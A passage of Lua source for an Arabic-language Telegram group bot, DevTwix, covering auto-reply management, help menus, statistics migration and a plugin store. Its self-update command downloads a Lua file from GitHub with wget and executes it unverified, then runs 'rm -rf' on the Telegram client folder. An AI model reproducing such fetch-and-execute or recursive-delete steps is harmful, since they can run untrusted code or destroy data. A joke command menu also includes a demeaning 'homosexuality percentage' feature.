DevHmD:del(DevTwix.."HmD:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end
---------------------------------------------------------------------------------------
if text and (text == 'حذف رد من متعدد' or text == 'مسح رد من متعدد') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevHmD:smembers(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevHmD:set(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if DelGpRedRedod == 'DelGpRedRedod' then
if text == "الغاء" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر" ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if not DevHmD:sismember(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,text) then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لايوجد رد متعدد لهذه الكلمه » "..text ,  1, "md")
return false
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙قم بارسال الرد المتعدد الذي تريد حذفه من الكلمه » "..text ,  1, "md")
DevHmD:set(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevHmD:set(DevTwix..'HmD:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
if text and (text == 'حذف رد متعدد' or text == 'مسح رد متعدد') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevHmD:smembers(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevHmD:set(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه لحذفها" ,  1, "md")
return false
end
if text == 'اضف رد متعدد' and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
DevHmD:set(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevHmD:get(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
if SetGpRedod == 'SetGpRedod' then
if text == "الغاء" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر" ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
if DevHmD:sismember(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,text) then
local HmD = "⋄︙لاتستطيع اضافة رد بالتاكيد مضاف في القائمه قم بحذفه اولا !"
keyboard = {} 
keyboard.inline_keyboard = {{{text="حذف الرد » "..text,callback_data="/DelRed:"..msg.sender_user_id_..text}}} 
Msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(HmD).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:del(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم حفظ الامر ارسل الرد الاول\n⋄︙للخروج ارسل » ( الغاء )" ,  1, "md")
DevHmD:set(DevTwix..'HmD:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevHmD:set(DevTwix..'HmD:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevHmD:sadd(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
---------------------------------------------------------------------------------------
if text and (text == 'حذف رد' or text == 'مسح رد') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
local List = DevHmD:smembers(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_)
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevHmD:set(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد' or text == 'اضافه رد' or text == 'اضافة رد') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
DevHmD:set(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevHmD:get(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
if SetGpRed == 'SetGpRed' then
if text == "الغاء" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر" ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
return false
end
Dev_HmD(msg.chat_id_, msg.id_, 1,"\n⋄︙الان ارسل الرد الذي تريد اضافته :\n⋄︙قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n\n⋄︙ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n\n⋄︙للخروج ارسل » ( الغاء )\n" ,  1, "md")
DevHmD:set(DevTwix..'HmD:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevHmD:set(DevTwix..'HmD:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevHmD:sadd(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_,text)
DevHmD:set(DevTwix..'DelManagerRep'..msg.chat_id_,text)
return false
end end
---------------------------------------------------------------------------------------
if text and (text == 'حذف رد عام' or text == '× مسح رد عام ×' or text == 'مسح رد عام' or text == 'حذف رد للكل' or text == 'مسح رد للكل' or text == 'مسح رد مطور' or text == 'حذف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
local List = DevHmD:smembers(DevTwix.."HmD:Sudo:AllRed")
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود مضافه" ,  1, "md")
return false
end end
DevHmD:set(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
if text and (text == 'اضف رد عام' or text == '× أضف رد عام ×' or text == 'اضف رد للكل' or text == 'اضف رد مطور') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:Rd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع اضافه رد وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الثانوي واعلى فقط ', 1, 'md')
else
DevHmD:set(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevHmD:get(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_)
if SetAllRed == 'SetAllRed' then
if text == "الغاء" then 
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء الامر" ,  1, "md")
DevHmD:del(DevTwix..'HmD:Add:AllRed'..msg.sender_user_id_)
return false
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "\n⋄︙الان ارسل الرد الذي تريد اضافته :\n⋄︙قد يكون (ملف - فديو - نص - ملصق - بصمه - متحركه )\n\n⋄︙ يمكنك اضافه الى النص :\n- `#username` > اسم المستخدم\n- `#msgs` > عدد رسائل المستخدم\n- `#name` > اسم المستخدم\n- `#id` > ايدي المستخدم\n- `#stast` > موقع المستخدم \n- `#edit` > عدد السحكات\n\n⋄︙للخروج ارسل » ( الغاء )\n" ,  1, "md")
DevHmD:set(DevTwix.."HmD:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevHmD:set(DevTwix.."HmD:Add:AllText"..msg.sender_user_id_, text)
DevHmD:sadd(DevTwix.."HmD:Sudo:AllRed",text)
DevHmD:set(DevTwix.."DelSudoRep",text)
return false 
end end
---------------------------------------------------------------------------------------
if text == 'الردود المتعدده' and Manager(msg) and ChCheck(msg) then
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير واعلى فقط ', 1, 'md')
else
local redod = DevHmD:smembers(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_)
MsgRep = '⋄︙قائمة الردود المتعدده »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد » '..#DevHmD:smembers(DevTwix..'HmD:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
MsgRep = '⋄︙لا توجد ردود متعدده مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == 'حذف الردود المتعدده' or text == 'مسح الردود المتعدده') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:GpRd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف ردود المتعدده وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevHmD:smembers(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_)
if #redod == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود متعدده مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevHmD:del(DevTwix..'HmD:Text:GpTexts'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Manager:GpRedod'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف الردود المتعدده")  
return false
end
end
end
end
---------------------------------------------------------------------------------------
if text == 'الردود' and Manager(msg) and ChCheck(msg) or text == 'ردود المدير' and Manager(msg) and ChCheck(msg) then
local redod = DevHmD:smembers(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_)
MsgRep = '⋄︙ردود المدير »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n'
for k,v in pairs(redod) do
if DevHmD:get(DevTwix.."HmD:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevHmD:get(DevTwix.."HmD:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevHmD:get(DevTwix.."HmD:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevHmD:get(DevTwix.."HmD:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevHmD:get(DevTwix.."HmD:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevHmD:get(DevTwix.."HmD:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevHmD:get(DevTwix.."HmD:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevHmD:get(DevTwix.."HmD:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) » {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⋄︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text =='حذف الردود' or text == 'مسح الردود' or text == 'حذف ردود المدير' or text == 'مسح ردود المدير') and ChCheck(msg) then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:GpRd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not Manager(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمدير او اعلى فقط ', 1, 'md')
else
local redod = DevHmD:smembers(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_)
if #redod == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevHmD:del(DevTwix..'HmD:Gif:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Voice:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Audio:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Photo:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Stecker:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Video:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:File:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Text:GpRed'..v..msg.chat_id_)
DevHmD:del(DevTwix..'HmD:Manager:GpRed'..msg.chat_id_)
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف ردود المدير")  
return false
end
end
end
---------------------------------------------------------------------------------------
if  text == "ردود المطور" and SecondSudo(msg) or text == "الردود العام" and SecondSudo(msg) or text == "ردود العام" and SecondSudo(msg) or text == "× الردود العامة ×" and SecondSudo(msg) then
local redod = DevHmD:smembers(DevTwix.."HmD:Sudo:AllRed")
MsgRep = '⋄︙ردود المطور »  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n'
for k,v in pairs(redod) do
if DevHmD:get(DevTwix.."HmD:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevHmD:get(DevTwix.."HmD:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevHmD:get(DevTwix.."HmD:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevHmD:get(DevTwix.."HmD:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevHmD:get(DevTwix.."HmD:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevHmD:get(DevTwix.."HmD:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevHmD:get(DevTwix.."HmD:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevHmD:get(DevTwix.."HmD:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) » {*'..dp..'*}\n' 
end
if #redod == 0 then
MsgRep = '⋄︙لا توجد ردود مضافه'
end
send(msg.chat_id_,msg.id_,MsgRep)
end
if text and (text == "حذف ردود المطور" or text == "حذف ردود العام" or text == "مسح ردود المطور" or text == "» مسح ردود العام ✧") then
if not Bot(msg) and DevHmD:get(DevTwix..'HmD:Lock:GpRd'..msg.chat_id_) then 
Dev_HmD(msg.chat_id_, msg.id_, 1,'⋄︙لاتستطيع حذف ردود المدير وذالك بسبب تعطيله', 1, 'md')
return false
end
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الثانوي او اعلى فقط ', 1, 'md')
else
local redod = DevHmD:smembers(DevTwix.."HmD:Sudo:AllRed")
if #redod == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙لا توجد ردود مضافه" ,  1, "md")
else
for k,v in pairs(redod) do
DevHmD:del(DevTwix.."HmD:Add:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Gif:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Voice:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Audio:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Photo:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Stecker:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Video:AllRed"..v)
DevHmD:del(DevTwix.."HmD:File:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Text:AllRed"..v)
DevHmD:del(DevTwix.."HmD:Sudo:AllRed")
end
ReplyStatus(msg,msg.sender_user_id_,"ReplyBy","⋄︙تم حذف ردود المطور")  
return false
end
end 
end
---------------------------------------------------------------------------------------
if text and text == "تغيير اسم البوت" and ChCheck(msg) or text and text == "× تغير اسم البوت ×" and ChCheck(msg) or text and text == "تغير اسم البوت" and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙ارسل لي اسم البوت الان" ,  1, "md") 
DevHmD:set(DevTwix..'HmD:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
if text and text == 'حذف اسم البوت' and ChCheck(msg) or text == 'مسح اسم البوت' and ChCheck(msg) then
if not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
DevHmD:del(DevTwix..'HmD:NameBot')
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙*تم مسح اسم البوت *",'md')
end end 
---------------------------------------------------------------------------------------
if text == "الاوامر" and Admin(msg) and ChCheck(msg) or text == "اوامر" and ChCheck(msg) or text == "مساعده" and ChCheck(msg) then
local Help = DevHmD:get(DevTwix..'HmD:Help')
local Text = [[
⋄︙*توجد » 5 اوامر في البوت
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙ارسل { م1 } » اوامر الحمايه
⋄︙ارسل { م2 } » اوامر الادمنيه
⋄︙ارسل { م3 } » اوامر المدراء
⋄︙ارسل { م4 } » اوامر المنشئين
⋄︙ارسل { م5 } » اوامر مطورين البوت
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]] 
keyboard = {} 
keyboard.inline_keyboard = {
{{text="𓍹 𝟏 𓍻",callback_data="/HelpList1:"..msg.sender_user_id_},{text="𓍹 𝟐 𓍻",callback_data="/HelpList2:"..msg.sender_user_id_},{text="𓍹 𝟑 𓍻",callback_data="/HelpList3:"..msg.sender_user_id_}},
{{text="𓍹 𝟒 𓍻",callback_data="/HelpList4:"..msg.sender_user_id_},{text="𓍹 𝟓 𓍻",callback_data="/HelpList5:"..msg.sender_user_id_},{text="𓍹 𝟔 𓍻",callback_data="/HelpList6:"..msg.sender_user_id_}},
{{text="{ آوآمر الترتيب }",callback_data="/HelpList7:"..msg.sender_user_id_},{text="{ آلالعاب }",callback_data="/HelpList8:"..msg.sender_user_id_}},
{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "م1" and Admin(msg) and ChCheck(msg) or text == "م2" and ChCheck(msg) or text == "م3" and ChCheck(msg) or text == "م4" and ChCheck(msg) or text == "م5" and ChCheck(msg) or text == "م6" and ChCheck(msg) then
local Help = DevHmD:get(DevTwix..'HmD:Help')
local Text = [[⋄︙*عليك استخدام اوامر التحكم بالقوائم*]] 
keyboard = {} 
keyboard.inline_keyboard = {
{{text="{ قائمة آلاوآمر }",callback_data="/HelpList:"..msg.sender_user_id_}},
{{text="᥀ TeaM Twix ˛",url="T.me/Devtwix"}},
{{text="• اخفاء الكليشة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "اوامر النسب" and Admin(msg) and ChCheck(msg) or text == "النسب" and ChCheck(msg) or text == "اوامر النسبه" and ChCheck(msg) or text == "النسبات" and ChCheck(msg) or text == "اوامر النسبة" and ChCheck(msg) or text == "نسب" and ChCheck(msg) then
local Help = DevHmD:get(DevTwix..'HmD:Help')
local Text = [[
⋄︙*اليك قائمة اوامر النسب
⋄︙هنالك » {10} نسب في القائمة
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙تفعيل اوامر النسب
⋄︙تعطيل اوامر النسب
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙نسبه الكره
⋄︙نسبه الغباء
⋄︙نسبه الحب
⋄︙نسبه الزحف
⋄︙نسبه المثليه
⋄︙نسبه الانوثه
⋄︙نسبه الرجوله
⋄︙نسبه التفاعل
⋄︙كشف الحيوان
⋄︙كشف الارتباط
•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••
⋄︙Source » @DevTwix .*
]] 
keyboard = {} 
keyboard.inline_keyboard = {{{text="᥀ TeaM Twix ˛",url="T.me/Devtwix"}},{{text="• اخفاء الكليشة •",callback_data="/HideHelpList:"..msg.sender_user_id_}}}
Msg_id = msg.id_/2097152/0.5
return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
---------------------------------------------------------------------------------------
if SecondSudo(msg) then
if text == "تحديث السورس" and ChTwixDev(msg) or text == "تحديث سورس" and ChTwixDev(msg) or text == "× تحديث السورس ×" and ChTwixDev(msg) then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙جاري تحديث سورس تويكس', 1, 'md') 
os.execute('rm -rf DevTwix.lua') 
os.execute('wget https://raw.githubusercontent.com/TwiXtele/DevTwix/main/DevTwix.lua') 
dofile('DevTwix.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' and ChTwixDev(msg) or text == 'تحديث البوت' and ChTwixDev(msg) or text == '× تحديث الملفات ×' then  
dofile('DevTwix.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تحديث الملفات", "md")
end
---------------------------------------------------------------------------------------
if text == 'نقل الاحصائيات' and ChCheck(msg) or text == '× نقل الاحصائيات ×' and ChCheck(msg) then
local Users = DevHmD:smembers(DevTwix.."User_Bot")
local Groups = DevHmD:smembers(DevTwix..'Chek:Groups')
local Sudos = DevHmD:smembers(DevTwix.."Sudo:User")
if DevHmD:get(DevTwix..'Name:Bot') then
DevHmD:set(DevTwix..'HmD:NameBot',(DevHmD:get(DevTwix..'Name:Bot') or 'تويكس'))
end
for i = 1, #Users do
local id = Users[i]
if id:match("^(%d+)") then
DevHmD:sadd(DevTwix..'HmD:Users',Users[i]) 
end
end
for i = 1, #Sudos do
DevHmD:sadd(DevTwix..'HmD:SudoBot:',Sudos[i]) 
end
for i = 1, #Groups do
DevHmD:sadd(DevTwix..'HmD:Groups',Groups[i]) 
if DevHmD:get(DevTwix.."Private:Group:Link"..Groups[i]) then
DevHmD:set(DevTwix.."HmD:Groups:Links"..Groups[i],DevHmD:get(DevTwix.."Private:Group:Link"..Groups[i]))
end
if DevHmD:get(DevTwix.."Get:Welcome:Group"..Groups[i]) then
DevHmD:set(DevTwix..'HmD:Groups:Welcomes'..Groups[i],DevHmD:get(DevTwix.."Get:Welcome:Group"..Groups[i]))
end
local list2 = DevHmD:smembers(DevTwix..'Constructor'..Groups[i])
for k,v in pairs(list2) do
DevHmD:sadd(DevTwix.."HmD:Constructor:"..Groups[i], v)
end
local list3 = DevHmD:smembers(DevTwix..'HMDicConstructor'..Groups[i])
for k,v in pairs(list3) do
DevHmD:sadd(DevTwix.."HmD:HMDicConstructor:"..Groups[i], v)
end
local list4 = DevHmD:smembers(DevTwix..'Manager'..Groups[i])
for k,v in pairs(list4) do
DevHmD:sadd(DevTwix.."HmD:Managers:"..Groups[i], v)
end
local list5 = DevHmD:smembers(DevTwix..'Mod:User'..Groups[i])
for k,v in pairs(list5) do
DevHmD:sadd(DevTwix.."HmD:Admins:"..Groups[i], v)
end
local list6 = DevHmD:smembers(DevTwix..'Special:User'..Groups[i])
for k,v in pairs(list6) do
DevHmD:sadd(DevTwix.."HmD:VipMem:"..Groups[i], v)
end
DevHmD:set(DevTwix.."HmD:Lock:Bots"..Groups[i],"del") DevHmD:hset(DevTwix.."HmD:Spam:Group:User"..Groups[i] ,"Spam:User","keed") 
LockList ={'HmD:Lock:Links','HmD:Lock:Forwards','HmD:Lock:Videos','HmD:Lock:Gifs','HmD:Lock:EditMsgs','HmD:Lock:Stickers','HmD:Lock:Farsi','HmD:Lock:Spam','HmD:Lock:WebLinks'}
for i,Lock in pairs(LockList) do
DevHmD:set(DevTwix..Lock..Groups[i],true)
end
end
send(msg.chat_id_, msg.id_,'⋄︙تم نقل » '..#Groups..' مجموعه\n⋄︙تم نقل » '..#Users..' مشترك\n⋄︙من التحديث القديم الى التحديث الجديد')
end
end
---------------------------------------------------------------------------------------
 if text == 'الملفات' and ChCheck(msg) and SecondSudo(msg) then
Files = '⋄︙*الملفات المفعله في البوت ᥊ \n••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••\n*'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '⋄︙لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" and HmDSudo(msg) or text == 'المتجر' and HmDSudo(msg) or text == '↫  المتجر ↯' and HmDSudo(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/TwiXtele/DevTwixFiles/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n⋄︙*قائمة متجر سورس ديف تويكس ᥊ ˛ \n⋄︙الملفات المتوفره حاليا في الاسفل ᥊ ˛\n••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉••\n\n*"
